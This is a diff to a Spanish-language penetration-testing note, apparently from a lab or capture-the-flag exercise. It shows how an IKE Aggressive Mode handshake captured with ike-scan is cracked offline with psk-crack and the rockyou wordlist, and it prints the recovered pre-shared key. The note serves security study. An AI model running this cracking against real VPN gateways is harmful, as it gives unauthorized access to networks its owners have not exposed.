@@ -10,4 +10,12 @@ Ejecutaremos el siguiente comando:
 `--aggresive` -> Envía identidades y parámetros en los primeros mensajes, sin esperar un handshake completo.
 `--pskcrack` -> Captura el handshake en Aggressive Mode y lo guarda en `psk.params`
 
-Usaremos [[PSK-CRACK]] 
+Usaremos [[PSK-CRACK]] Su objetivo principal es intentar adivinar la Pre-Shared Key (PSK)
+`psk-crack -d /usr/share/wordlists/rockyou.txt psk.params`
+Con `-d` seleccionaremos la wordlist y a continuacion le pasaremos el archivo generado anteriormente.
+
+Nos devolvera la password:
+`key "freakingrockstarontheroad" matches SHA1 hash 9acd999de926d953c088daf7b69efcfdecbd1893`
+
+
+
